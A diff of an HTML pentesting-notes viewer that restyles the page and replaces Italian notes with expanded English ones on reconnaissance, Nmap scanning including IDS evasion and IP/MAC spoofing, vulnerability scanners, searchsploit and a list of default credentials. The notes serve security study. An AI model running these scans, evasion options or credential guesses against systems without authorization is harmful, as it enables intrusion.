@@ -12,22 +12,21 @@
         }
 
         :root {
-            --bg-primary: #0a0e27;
-            --bg-secondary: #151932;
-            --bg-tertiary: #1e2339;
-            --accent: #6366f1;
-            --accent-hover: #818cf8;
-            --text-primary: #e2e8f0;
-            --text-secondary: #94a3b8;
-            --border: #2d3548;
-            --shadow: rgba(0, 0, 0, 0.3);
+            --bg-primary: #0d0d0d;
+            --bg-secondary: #1a1a1a;
+            --bg-tertiary: #262626;
+            --accent: #ffffff;
+            --accent-dim: #a3a3a3;
+            --text-primary: #ffffff;
+            --text-secondary: #737373;
+            --border: #404040;
         }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: var(--bg-primary);
             color: var(--text-primary);
-            overflow-x: hidden;
+            overflow: hidden;
         }
 
         .container {
@@ -42,7 +41,6 @@
             border-right: 1px solid var(--border);
             display: flex;
             flex-direction: column;
-            overflow-y: auto;
         }
 
         .sidebar-header {
@@ -51,25 +49,59 @@
         }
 
         .sidebar-header h1 {
-            font-size: 20px;
-            color: var(--accent);
+            font-size: 18px;
+            color: var(--text-primary);
             font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        .sidebar-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .search-sidebar {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .search-sidebar-input {
+            width: 100%;
+            padding: 10px 12px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+
+        .search-sidebar-input:focus {
+            outline: none;
+            border-color: var(--accent-dim);
+        }
+
+        .search-sidebar-input::placeholder {
+            color: var(--text-secondary);
         }
 
         .sidebar-nav {
             flex: 1;
+            overflow-y: auto;
             padding: 16px 0;
         }
 
         .nav-section {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .nav-section-title {
             padding: 8px 20px;
-            font-size: 12px;
+            font-size: 11px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.2px;
             color: var(--text-secondary);
             font-weight: 600;
         }
@@ -77,11 +109,12 @@
         .nav-item {
             padding: 10px 20px;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.15s;
             color: var(--text-secondary);
             display: flex;
             align-items: center;
             gap: 10px;
+            font-size: 14px;
         }
 
         .nav-item:hover {
@@ -91,13 +124,9 @@
 
         .nav-item.active {
             background: var(--bg-tertiary);
-            color: var(--accent);
-            border-left: 3px solid var(--accent);
-        }
-
-        .nav-item-icon {
-            width: 18px;
-            height: 18px;
+            color: var(--text-primary);
+            border-left: 2px solid var(--accent);
+            font-weight: 500;
         }
 
         /* MAIN CONTENT */
@@ -106,94 +135,59 @@
             display: flex;
             flex-direction: column;
             overflow: hidden;
+            background: var(--bg-primary);
         }
 
-        /* TOPBAR */
-        .topbar {
-            background: var(--bg-secondary);
-            border-bottom: 1px solid var(--border);
-            padding: 16px 32px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .search-container {
-            flex: 1;
-            max-width: 600px;
-            position: relative;
-        }
-
-        .search-input {
-            width: 100%;
-            padding: 12px 16px 12px 44px;
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 14px;
-            transition: all 0.2s;
-        }
-
-        .search-input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
-        }
-
-        .search-icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-secondary);
-        }
-
-        /* CONTENT AREA */
-        .content-area {
+        /* FILE VIEWER */
+        .file-viewer {
             flex: 1;
             overflow-y: auto;
-            padding: 32px 48px;
+            padding: 48px 64px;
         }
 
-        .content-wrapper {
-            max-width: 900px;
+        .file-content {
+            max-width: 800px;
             margin: 0 auto;
         }
 
-        .page-title {
-            font-size: 36px;
-            font-weight: 700;
+        .file-title {
+            font-size: 32px;
+            font-weight: 600;
             margin-bottom: 8px;
             color: var(--text-primary);
+            letter-spacing: -0.5px;
         }
 
-        .page-meta {
+        .file-meta {
             color: var(--text-secondary);
-            font-size: 14px;
-            margin-bottom: 32px;
+            font-size: 13px;
+            margin-bottom: 40px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
         }
 
         .content h2 {
             font-size: 24px;
-            margin-top: 32px;
+            margin-top: 40px;
             margin-bottom: 16px;
             color: var(--text-primary);
-            border-bottom: 2px solid var(--border);
-            padding-bottom: 8px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
         }
 
         .content h3 {
-            font-size: 20px;
-            margin-top: 24px;
+            font-size: 18px;
+            margin-top: 32px;
             margin-bottom: 12px;
-            color: var(--accent-hover);
+            color: var(--accent-dim);
+            font-weight: 600;
         }
 
         .content p {
             line-height: 1.7;
             margin-bottom: 16px;
             color: var(--text-secondary);
+            font-size: 15px;
         }
 
         .content ul, .content ol {
@@ -203,75 +197,106 @@
         }
 
         .content li {
-            margin-bottom: 8px;
-            line-height: 1.6;
+            margin-bottom: 10px;
+            line-height: 1.7;
+            font-size: 15px;
         }
 
         .content code {
-            background: var(--bg-tertiary);
-            padding: 2px 6px;
+            background: var(--bg-secondary);
+            padding: 3px 7px;
             border-radius: 4px;
             font-family: 'Courier New', monospace;
-            font-size: 14px;
-            color: var(--accent-hover);
+            font-size: 13px;
+            color: var(--text-primary);
+            border: 1px solid var(--border);
         }
 
         .content pre {
-            background: var(--bg-tertiary);
-            padding: 16px;
+            background: var(--bg-secondary);
+            padding: 20px;
             border-radius: 8px;
             overflow-x: auto;
-            margin-bottom: 16px;
+            margin: 24px 0;
             border: 1px solid var(--border);
         }
 
         .content pre code {
             background: none;
             padding: 0;
-            color: var(--text-primary);
+            border: none;
+            color: var(--accent-dim);
+            font-size: 14px;
+            line-height: 1.6;
         }
 
         .content blockquote {
-            border-left: 4px solid var(--accent);
-            padding-left: 16px;
-            margin: 16px 0;
+            border-left: 3px solid var(--accent-dim);
+            padding-left: 20px;
+            margin: 24px 0;
             color: var(--text-secondary);
             font-style: italic;
         }
 
-        /* WELCOME PAGE */
+        .content strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        /* WELCOME CARDS */
         .welcome-card {
             background: var(--bg-secondary);
             border: 1px solid var(--border);
-            border-radius: 12px;
+            border-radius: 8px;
             padding: 32px;
             margin-bottom: 24px;
-            box-shadow: 0 4px 6px var(--shadow);
         }
 
         .welcome-card h2 {
-            border: none;
             margin-top: 0;
-            color: var(--accent);
+            font-size: 20px;
+        }
+
+        /* EMPTY STATE */
+        .empty-state {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            text-align: center;
+            color: var(--text-secondary);
+            padding: 48px;
+        }
+
+        .empty-state-content h2 {
+            font-size: 24px;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+        }
+
+        .empty-state-content p {
+            font-size: 15px;
+            color: var(--text-secondary);
         }
 
         /* SCROLLBAR */
         ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
+            width: 10px;
+            height: 10px;
         }
 
         ::-webkit-scrollbar-track {
-            background: var(--bg-secondary);
+            background: var(--bg-primary);
         }
 
         ::-webkit-scrollbar-thumb {
-            background: var(--border);
-            border-radius: 4px;
+            background: var(--bg-tertiary);
+            border-radius: 5px;
+            border: 2px solid var(--bg-primary);
         }
 
         ::-webkit-scrollbar-thumb:hover {
-            background: var(--text-secondary);
+            background: var(--border);
         }
 
         /* RESPONSIVE */
@@ -281,13 +306,14 @@
                 left: -280px;
                 z-index: 1000;
                 transition: left 0.3s;
+                height: 100vh;
             }
 
             .sidebar.open {
                 left: 0;
             }
 
-            .content-area {
+            .file-viewer {
                 padding: 24px 20px;
             }
         }
@@ -302,85 +328,27 @@
         <!-- SIDEBAR -->
         <aside class="sidebar">
             <div class="sidebar-header">
-                <h1>🛡️ Pentesting Notes</h1>
+                <h1>PENTESTING NOTES</h1>
             </div>
-            <nav class="sidebar-nav">
-                <div class="nav-section">
-                    <div class="nav-section-title">Getting Started</div>
-                    <div class="nav-item active" data-page="home">
-                        <span class="nav-item-icon">🏠</span>
-                        <span>Home</span>
-                    </div>
+            <div class="sidebar-content">
+                <div class="search-sidebar">
+                    <input type="text" class="search-sidebar-input" id="searchInput" placeholder="Search files...">
                 </div>
-
-                <div class="nav-section">
-                    <div class="nav-section-title">Reconnaissance</div>
-                    <div class="nav-item" data-page="recon-passive">
-                        <span class="nav-item-icon">🔍</span>
-                        <span>Passive Recon</span>
-                    </div>
-                    <div class="nav-item" data-page="recon-active">
-                        <span class="nav-item-icon">🎯</span>
-                        <span>Active Recon</span>
-                    </div>
-                </div>
-
-                <div class="nav-section">
-                    <div class="nav-section-title">Scanning</div>
-                    <div class="nav-item" data-page="scanning-nmap">
-                        <span class="nav-item-icon">📡</span>
-                        <span>Nmap Scanning</span>
-                    </div>
-                    <div class="nav-item" data-page="scanning-vuln">
-                        <span class="nav-item-icon">🐛</span>
-                        <span>Vulnerability Scanning</span>
-                    </div>
-                </div>
-
-                <div class="nav-section">
-                    <div class="nav-section-title">Exploitation</div>
-                    <div class="nav-item" data-page="exploit-web">
-                        <span class="nav-item-icon">🌐</span>
-                        <span>Web Exploitation</span>
-                    </div>
-                    <div class="nav-item" data-page="exploit-priv">
-                        <span class="nav-item-icon">⬆️</span>
-                        <span>Privilege Escalation</span>
-                    </div>
-                </div>
-
-                <div class="nav-section">
-                    <div class="nav-section-title">Tools</div>
-                    <div class="nav-item" data-page="tools-metasploit">
-                        <span class="nav-item-icon">🔧</span>
-                        <span>Metasploit</span>
-                    </div>
-                    <div class="nav-item" data-page="tools-burp">
-                        <span class="nav-item-icon">🕷️</span>
-                        <span>Burp Suite</span>
-                    </div>
-                </div>
-            </nav>
+                <nav class="sidebar-nav" id="sidebarNav">
+                    <!-- Files will be loaded here dynamically -->
+                </nav>
+            </div>
         </aside>
 
         <!-- MAIN CONTENT -->
         <main class="main-content">
-            <!-- TOPBAR -->
-            <div class="topbar">
-                <div class="search-container">
-                    <svg class="search-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <circle cx="11" cy="11" r="8"></circle>
-                        <path d="m21 21-4.35-4.35"></path>
-                    </svg>
-                    <input type="text" class="search-input" id="searchInput" placeholder="Cerca negli appunti...">
-                </div>
-            </div>
-
-            <!-- CONTENT AREA -->
-            <div class="content-area">
-                <div class="content-wrapper">
-                    <div id="pageContent">
-                        <!-- CONTENUTO DINAMICO -->
+            <div class="file-viewer">
+                <div class="file-content" id="fileContent">
+                    <div class="empty-state">
+                        <div class="empty-state-content">
+                            <h2>Select a file</h2>
+                            <p>Choose a document from the sidebar to view its contents</p>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -388,420 +356,590 @@
     </div>
 
     <script>
-        // DATABASE DELLE PAGINE
-        const pages = {
-            home: {
-                title: 'Benvenuto nelle Pentesting Notes',
-                meta: 'Documentazione completa per penetration testing',
+        // COMPLETE FILE DATABASE
+        const files = {
+            // ===== INTRODUCTION =====
+            'intro-cybersecurity': {
+                category: 'Introduction',
+                title: 'Introduction to Cybersecurity',
                 content: `
-                    <div class="welcome-card">
-                        <h2>👋 Benvenuto!</h2>
-                        <p>Questa è la tua raccolta di appunti per il penetration testing. Qui troverai guide, comandi, tecniche e best practices per condurre test di sicurezza efficaci.</p>
-                    </div>
+                    <h2>What is Cybersecurity?</h2>
+                    <p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These attacks aim to access, change, or destroy sensitive information, extort money, or interrupt normal business processes.</p>
 
-                    <div class="welcome-card">
-                        <h2>📚 Categorie Principali</h2>
-                        <ul>
-                            <li><strong>Reconnaissance</strong> - Tecniche di raccolta informazioni passive e attive</li>
-                            <li><strong>Scanning</strong> - Port scanning, vulnerability assessment, enumeration</li>
-                            <li><strong>Exploitation</strong> - Tecniche di sfruttamento vulnerabilità</li>
-                            <li><strong>Tools</strong> - Guide per i principali strumenti di pentesting</li>
-                        </ul>
-                    </div>
+                    <h2>Core Principles - CIA Triad</h2>
+                    <h3>Confidentiality</h3>
+                    <p>Ensuring information is accessible only to authorized parties.</p>
 
-                    <div class="welcome-card">
-                        <h2>🚀 Come Iniziare</h2>
-                        <p>Usa il menu laterale per navigare tra le diverse sezioni. La barra di ricerca in alto ti permette di trovare rapidamente argomenti specifici.</p>
-                    </div>
-                `
-            },
-            'recon-passive': {
-                title: 'Passive Reconnaissance',
-                meta: 'Tecniche di raccolta informazioni senza interagire direttamente con il target',
-                content: `
-                    <h2>Introduzione</h2>
-                    <p>La reconnaissance passiva consiste nel raccogliere informazioni sul target senza interagire direttamente con i suoi sistemi.</p>
+                    <h3>Integrity</h3>
+                    <p>Maintaining accuracy and completeness of data, preventing unauthorized modification.</p>
 
-                    <h2>OSINT - Open Source Intelligence</h2>
-                    <h3>Strumenti Principali</h3>
+                    <h3>Availability</h3>
+                    <p>Ensuring systems and data are accessible when needed by authorized users.</p>
+
+                    <h2>Types of Threats</h2>
                     <ul>
-                        <li><strong>Google Dorking</strong> - Ricerche avanzate con operatori Google</li>
-                        <li><strong>Shodan</strong> - Motore di ricerca per dispositivi IoT</li>
-                        <li><strong>theHarvester</strong> - Raccolta email, domini, IP</li>
-                        <li><strong>Maltego</strong> - Visualizzazione relazioni tra entità</li>
+                        <li><strong>Malware</strong> - Viruses, trojans, ransomware, spyware</li>
+                        <li><strong>Phishing</strong> - Social engineering attacks via email</li>
+                        <li><strong>DDoS</strong> - Distributed Denial of Service attacks</li>
+                        <li><strong>SQL Injection</strong> - Database manipulation attacks</li>
+                        <li><strong>Zero-Day Exploits</strong> - Attacks on unknown vulnerabilities</li>
                     </ul>
 
-                    <h3>Comandi Utili</h3>
-                    <pre><code># theHarvester per email e subdomain
-theHarvester -d example.com -b google,bing
-
-# Whois lookup
-whois example.com
-
-# DNS enumeration
-dig example.com ANY
-nslookup example.com</code></pre>
-
-                    <h2>Google Dorks Utili</h2>
-                    <pre><code>site:example.com filetype:pdf
-site:example.com inurl:admin
-site:example.com intitle:"index of"</code></pre>
-
-                    <h2>Note Importanti</h2>
-                    <blockquote>
-                        Assicurati sempre di avere l'autorizzazione prima di condurre qualsiasi attività di reconnaissance su un target.
-                    </blockquote>
+                    <h2>Defense in Depth</h2>
+                    <p>A layered security approach using multiple defensive mechanisms:</p>
+                    <ul>
+                        <li>Physical security</li>
+                        <li>Network security</li>
+                        <li>Application security</li>
+                        <li>Data security</li>
+                        <li>User education</li>
+                    </ul>
                 `
             },
-            'recon-active': {
-                title: 'Active Reconnaissance',
-                meta: 'Tecniche di scansione attiva e interazione con il target',
+
+            'intro-pentesting': {
+                category: 'Introduction',
+                title: 'Introduction to Penetration Testing',
                 content: `
-                    <h2>Introduzione</h2>
-                    <p>La reconnaissance attiva implica l'interazione diretta con i sistemi del target per raccogliere informazioni.</p>
+                    <h2>What is Penetration Testing?</h2>
+                    <p>Penetration testing (pentesting) is an authorized simulated cyberattack on a computer system to evaluate its security. The goal is to identify vulnerabilities before malicious actors can exploit them.</p>
+
+                    <h2>Types of Penetration Tests</h2>
+                    <h3>Black Box Testing</h3>
+                    <p>No prior knowledge of the target system. Simulates an external attacker.</p>
+
+                    <h3>White Box Testing</h3>
+                    <p>Complete knowledge of the system, including source code and architecture.</p>
+
+                    <h3>Gray Box Testing</h3>
+                    <p>Partial knowledge of the system. Simulates an insider threat.</p>
+
+                    <h2>Penetration Testing Phases</h2>
+                    <ul>
+                        <li><strong>Planning & Reconnaissance</strong> - Define scope and gather intelligence</li>
+                        <li><strong>Scanning</strong> - Identify open ports, services, and vulnerabilities</li>
+                        <li><strong>Gaining Access</strong> - Exploit vulnerabilities to enter the system</li>
+                        <li><strong>Maintaining Access</strong> - Test persistence mechanisms</li>
+                        <li><strong>Analysis & Reporting</strong> - Document findings and recommendations</li>
+                    </ul>
+
+                    <h2>Legal Considerations</h2>
+                    <blockquote>
+                        Always obtain written authorization before conducting any penetration test. Unauthorized testing is illegal and can result in serious consequences.
+                    </blockquote>
+
+                    <h2>Required Skills</h2>
+                    <ul>
+                        <li>Networking fundamentals (TCP/IP, DNS, HTTP)</li>
+                        <li>Operating systems (Linux, Windows)</li>
+                        <li>Programming/scripting (Python, Bash, PowerShell)</li>
+                        <li>Web application security</li>
+                        <li>Database security</li>
+                        <li>Social engineering</li>
+                    </ul>
+                `
+            },
+
+            // ===== RECONNAISSANCE =====
+            'recon-passive': {
+                category: 'Reconnaissance',
+                title: 'Passive Reconnaissance',
+                content: `
+                    <h2>Overview</h2>
+                    <p>Passive reconnaissance involves gathering information without directly interacting with the target system. This minimizes detection risk.</p>
+
+                    <h2>OSINT - Open Source Intelligence</h2>
+                    <h3>Search Engines</h3>
+                    <pre><code># Google Dorks
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:"index of"
+site:target.com ext:sql | ext:db
+intext:"password" site:target.com</code></pre>
+
+                    <h3>WHOIS Lookup</h3>
+                    <pre><code># Domain information
+whois target.com
+
+# IP information
+whois 192.168.1.1</code></pre>
+
+                    <h3>DNS Reconnaissance</h3>
+                    <pre><code># DNS records
+dig target.com ANY
+nslookup target.com
+
+# Reverse DNS
+dig -x 192.168.1.1</code></pre>
+
+                    <h2>theHarvester</h2>
+                    <p>Email, subdomain, and name harvesting tool.</p>
+                    <pre><code># Basic usage
+theHarvester -d target.com -b google
+
+# Multiple sources
+theHarvester -d target.com -b google,bing,linkedin
+
+# Save results
+theHarvester -d target.com -b all -f output</code></pre>
+
+                    <h2>Shodan</h2>
+                    <p>Search engine for Internet-connected devices.</p>
+                    <pre><code># Example searches
+hostname:target.com
+org:"Target Organization"
+port:22 country:IT
+apache country:US</code></pre>
+
+                    <h2>Social Media Intelligence</h2>
+                    <ul>
+                        <li>LinkedIn - Employee information, organizational structure</li>
+                        <li>Twitter - Company announcements, tech stack mentions</li>
+                        <li>GitHub - Leaked credentials, internal tools</li>
+                        <li>Pastebin - Data leaks, credentials</li>
+                    </ul>
+
+                    <h2>Tools</h2>
+                    <ul>
+                        <li><strong>Maltego</strong> - Data mining and link analysis</li>
+                        <li><strong>SpiderFoot</strong> - Automated OSINT collection</li>
+                        <li><strong>Recon-ng</strong> - Web reconnaissance framework</li>
+                        <li><strong>FOCA</strong> - Metadata extraction from documents</li>
+                    </ul>
+                `
+            },
+
+            'recon-active': {
+                category: 'Reconnaissance',
+                title: 'Active Reconnaissance',
+                content: `
+                    <h2>Overview</h2>
+                    <p>Active reconnaissance involves directly interacting with target systems to gather information. Higher detection risk but more detailed results.</p>
 
                     <h2>DNS Enumeration</h2>
-                    <pre><code># Zone transfer
-dig axfr @nameserver example.com
+                    <h3>Zone Transfer</h3>
+                    <pre><code># Attempt zone transfer
+dig axfr @nameserver target.com
 
-# Subdomain brute force
-dnsrecon -d example.com -D subdomains.txt -t brt
+# Using host
+host -l target.com nameserver</code></pre>
+
+                    <h3>Subdomain Enumeration</h3>
+                    <pre><code># DNSrecon
+dnsrecon -d target.com -t std
+dnsrecon -d target.com -D wordlist.txt -t brt
 
 # Fierce
-fierce -dns example.com</code></pre>
+fierce --domain target.com
 
-                    <h2>Port Scanning Basics</h2>
-                    <pre><code># Quick scan
+# Sublist3r
+sublist3r -d target.com</code></pre>
+
+                    <h2>Port Scanning</h2>
+                    <h3>Quick Scans</h3>
+                    <pre><code># Fast scan common ports
 nmap -F target.com
 
-# Full TCP scan
+# Top 1000 ports
+nmap --top-ports 1000 target.com</code></pre>
+
+                    <h3>Detailed Scans</h3>
+                    <pre><code># All TCP ports
 nmap -p- target.com
 
 # Service version detection
-nmap -sV target.com</code></pre>
+nmap -sV -p- target.com
+
+# OS detection
+nmap -O target.com
+
+# Aggressive scan
+nmap -A -p- target.com</code></pre>
 
                     <h2>Web Application Discovery</h2>
-                    <ul>
-                        <li>Directory enumeration con <code>gobuster</code> o <code>dirbuster</code></li>
-                        <li>Identificazione CMS e tecnologie</li>
-                        <li>Analisi robots.txt e sitemap.xml</li>
-                    </ul>
+                    <h3>Directory Enumeration</h3>
+                    <pre><code># Gobuster
+gobuster dir -u http://target.com -w wordlist.txt
+
+# With extensions
+gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
+
+# Dirb
+dirb http://target.com wordlist.txt</code></pre>
+
+                    <h3>Technology Identification</h3>
+                    <pre><code># Whatweb
+whatweb target.com
+
+# Wappalyzer (browser extension)
+# WafW00f (WAF detection)
+wafw00f target.com</code></pre>
+
+                    <h2>Network Mapping</h2>
+                    <pre><code># Ping sweep
+nmap -sn 192.168.1.0/24
+
+# Traceroute
+traceroute target.com
+
+# ARP scan (local network)
+arp-scan -l</code></pre>
+
+                    <h2>SMTP Enumeration</h2>
+                    <pre><code># User enumeration
+smtp-user-enum -M VRFY -U users.txt -t target.com
+
+# Manual testing
+telnet target.com 25
+VRFY root
+VRFY admin</code></pre>
                 `
             },
-            'scanning-nmap': {
-                title: 'Nmap Scanning Guide',
-                meta: 'Guida completa all\'uso di Nmap per port scanning',
-                content: `
-                    <h2>Introduzione a Nmap</h2>
-                    <p>Nmap è lo standard de facto per il port scanning e la network discovery.</p>
 
-                    <h2>Tipi di Scan</h2>
+            // ===== SCANNING =====
+            'scanning-nmap': {
+                category: 'Scanning',
+                title: 'Nmap Complete Guide',
+                content: `
+                    <h2>Introduction</h2>
+                    <p>Nmap (Network Mapper) is the industry standard for network discovery and security auditing.</p>
+
+                    <h2>Basic Scan Types</h2>
                     <h3>TCP Scans</h3>
-                    <pre><code># TCP Connect Scan
+                    <pre><code># TCP Connect scan (-sT)
 nmap -sT target.com
 
-# SYN Scan (stealth)
+# SYN scan (stealth) - requires root
 nmap -sS target.com
 
-# Full TCP port scan
-nmap -sS -p- target.com</code></pre>
+# ACK scan (firewall detection)
+nmap -sA target.com
+
+# Window scan
+nmap -sW target.com
+
+# Maimon scan
+nmap -sM target.com</code></pre>
 
                     <h3>UDP Scans</h3>
-                    <pre><code># UDP Scan
+                    <pre><code># UDP scan
 nmap -sU target.com
 
-# Top UDP ports
-nmap -sU --top-ports 20 target.com</code></pre>
+# UDP + TCP
+nmap -sU -sS target.com
 
-                    <h2>Service Detection</h2>
+# Top UDP ports
+nmap -sU --top-ports 100 target.com</code></pre>
+
+                    <h2>Port Specification</h2>
+                    <pre><code># Single port
+nmap -p 80 target.com
+
+# Multiple ports
+nmap -p 80,443,8080 target.com
+
+# Port range
+nmap -p 1-1000 target.com
+
+# All ports
+nmap -p- target.com
+
+# Fast scan (top 100)
+nmap -F target.com</code></pre>
+
+                    <h2>Service & Version Detection</h2>
                     <pre><code># Version detection
 nmap -sV target.com
 
-# Aggressive detection
-nmap -A target.com
+# Aggressive version detection
+nmap -sV --version-intensity 9 target.com
 
-# OS detection
-nmap -O target.com</code></pre>
+# Light version detection
+nmap -sV --version-intensity 0 target.com</code></pre>
+
+                    <h2>OS Detection</h2>
+                    <pre><code># OS detection
+nmap -O target.com
+
+# Aggressive OS detection
+nmap -O --osscan-guess target.com
+
+# Limit OS detection
+nmap -O --max-os-tries 1 target.com</code></pre>
 
                     <h2>NSE Scripts</h2>
                     <pre><code># Default scripts
 nmap -sC target.com
 
-# Vuln scripts
+# All scripts
+nmap --script all target.com
+
+# Vulnerability scripts
 nmap --script vuln target.com
 
+# Specific category
+nmap --script auth target.com
+
 # Specific script
-nmap --script http-enum target.com</code></pre>
+nmap --script http-title target.com
+
+# Multiple scripts
+nmap --script "http-*" target.com</code></pre>
+
+                    <h2>Timing & Performance</h2>
+                    <pre><code># Timing templates (0-5)
+nmap -T0 target.com  # Paranoid
+nmap -T1 target.com  # Sneaky
+nmap -T2 target.com  # Polite
+nmap -T3 target.com  # Normal (default)
+nmap -T4 target.com  # Aggressive
+nmap -T5 target.com  # Insane
+
+# Custom timing
+nmap --min-rate 100 target.com
+nmap --max-rate 1000 target.com</code></pre>
+
+                    <h2>Firewall/IDS Evasion</h2>
+                    <pre><code># Fragment packets
+nmap -f target.com
+
+# MTU specification
+nmap --mtu 24 target.com
+
+# Decoy scan
+nmap -D RND:10 target.com
+
+# Spoof source IP
+nmap -S 192.168.1.100 target.com
+
+# Spoof MAC
+nmap --spoof-mac Apple target.com
+
+# Randomize hosts
+nmap --randomize-hosts target.com</code></pre>
 
                     <h2>Output Options</h2>
-                    <pre><code># All formats
-nmap -oA outputfile target.com
+                    <pre><code># Normal output
+nmap -oN scan.txt target.com
 
 # XML output
 nmap -oX scan.xml target.com
 
 # Grepable output
-nmap -oG scan.gnmap target.com</code></pre>
+nmap -oG scan.gnmap target.com
+
+# All formats
+nmap -oA scan target.com
+
+# Append to file
+nmap -oN scan.txt --append-output target.com</code></pre>
+
+                    <h2>Practical Examples</h2>
+                    <pre><code># Quick web server scan
+nmap -p 80,443 -sV target.com
+
+# Full comprehensive scan
+nmap -sS -sV -O -p- -T4 -A target.com
+
+# Stealth scan
+nmap -sS -T2 -f -D RND:10 target.com
+
+# Vulnerability assessment
+nmap -sV --script vuln -p- target.com
+
+# Network discovery
+nmap -sn 192.168.1.0/24</code></pre>
                 `
             },
-            'scanning-vuln': {
-                title: 'Vulnerability Scanning',
-                meta: 'Tools e tecniche per vulnerability assessment',
-                content: `
-                    <h2>Vulnerability Scanners</h2>
-                    
-                    <h3>Nessus</h3>
-                    <p>Scanner commerciale completo per vulnerability assessment.</p>
 
-                    <h3>OpenVAS</h3>
-                    <p>Alternative open source a Nessus.</p>
-                    <pre><code># Avvio OpenVAS
+            'scanning-vuln': {
+                category: 'Scanning',
+                title: 'Vulnerability Scanning',
+                content: `
+                    <h2>Overview</h2>
+                    <p>Vulnerability scanning identifies security weaknesses in systems, applications, and networks.</p>
+
+                    <h2>OpenVAS</h2>
+                    <h3>Installation & Setup</h3>
+                    <pre><code># Install (Kali Linux)
+apt install openvas
+
+# Setup
+gvm-setup
+
+# Start services
 gvm-start
 
-# Creazione target e scan via web interface
-# https://localhost:9392</code></pre>
+# Access web interface
+https://localhost:9392</code></pre>
 
-                    <h3>Nikto</h3>
-                    <p>Scanner per web server vulnerabilities.</p>
+                    <h3>Command Line</h3>
+                    <pre><code># Create target
+gvm-cli socket --xml "<create_target><name>Target</name><hosts>192.168.1.1</hosts></create_target>"
+
+# Create task
+gvm-cli socket --xml "<create_task><name>Scan</name><target id='target-id'/></create_task>"
+
+# Start scan
+gvm-cli socket --xml "<start_task task_id='task-id'/>"</code></pre>
+
+                    <h2>Nikto</h2>
+                    <p>Web server vulnerability scanner.</p>
                     <pre><code># Basic scan
 nikto -h http://target.com
 
-# Con tuning
-nikto -h target.com -Tuning 123bde</code></pre>
+# SSL scan
+nikto -h https://target.com
+
+# Specify port
+nikto -h target.com -p 8080
+
+# Tuning (select tests)
+nikto -h target.com -Tuning 123bde
+
+# Save output
+nikto -h target.com -o report.html -Format html</code></pre>
+
+                    <h3>Nikto Tuning Options</h3>
+                    <ul>
+                        <li><code>1</code> - Interesting files</li>
+                        <li><code>2</code> - Misconfiguration</li>
+                        <li><code>3</code> - Information disclosure</li>
+                        <li><code>4</code> - Injection (XSS/Script/HTML)</li>
+                        <li><code>5</code> - Remote file retrieval</li>
+                        <li><code>6</code> - Denial of service</li>
+                        <li><code>7</code> - Remote file retrieval (server-wide)</li>
+                        <li><code>8</code> - Command execution</li>
+                        <li><code>9</code> - SQL injection</li>
+                        <li><code>b</code> - Software identification</li>
+                    </ul>
+
+                    <h2>Nessus</h2>
+                    <h3>Installation</h3>
+                    <pre><code># Download from tenable.com
+# Install
+dpkg -i Nessus-*.deb
+
+# Start service
+systemctl start nessusd
+
+# Access web interface
+https://localhost:8834</code></pre>
+
+                    <h2>WPScan</h2>
+                    <p>WordPress vulnerability scanner.</p>
+                    <pre><code># Basic scan
+wpscan --url http://target.com
+
+# Enumerate users
+wpscan --url http://target.com --enumerate u
+
+# Enumerate plugins
+wpscan --url http://target.com --enumerate p
+
+# Enumerate themes
+wpscan --url http://target.com --enumerate t
+
+# Aggressive detection
+wpscan --url http://target.com --enumerate ap,at,u --detection-mode aggressive
+
+# With API token for vulnerabilities
+wpscan --url http://target.com --api-token YOUR_TOKEN</code></pre>
 
                     <h2>Manual Vulnerability Testing</h2>
+                    <h3>Outdated Software</h3>
+                    <pre><code># Check versions
+curl -I http://target.com
+nmap -sV target.com
+
+# Search for CVEs
+searchsploit apache 2.4.1</code></pre>
+
+                    <h3>Default Credentials</h3>
                     <ul>
-                        <li>Verifica versioni software obsolete</li>
-                        <li>Test configurazioni di default</li>
-                        <li>Ricerca CVE note per le versioni identificate</li>
+                        <li>admin:admin</li>
+                        <li>admin:password</li>
+                        <li>root:root</li>
+                        <li>administrator:administrator</li>
                     </ul>
+
+                    <h3>Common Misconfigurations</h3>
+                    <ul>
+                        <li>Directory listing enabled</li>
+                        <li>Backup files accessible (.bak, .old, ~)</li>
+                        <li>Debug mode enabled</li>
+                        <li>Verbose error messages</li>
+                        <li>Unnecessary services running</li>
+                    </ul>
+
+                    <h2>Searchsploit</h2>
+                    <pre><code># Search exploits
+searchsploit apache
+
+# Search for specific version
+searchsploit apache 2.4
+
+# Copy exploit
+searchsploit -m 12345.py
+
+# Update database
+searchsploit -u</code></pre>
                 `
             },
+
+            // ===== EXPLOITATION =====
             'exploit-web': {
+                category: 'Exploitation',
                 title: 'Web Application Exploitation',
-                meta: 'Tecniche di exploitation per applicazioni web',
                 content: `
-                    <h2>Common Web Vulnerabilities</h2>
-
-                    <h3>SQL Injection</h3>
-                    <pre><code># Basic test
+                    <h2>SQL Injection</h2>
+                    <h3>Detection</h3>
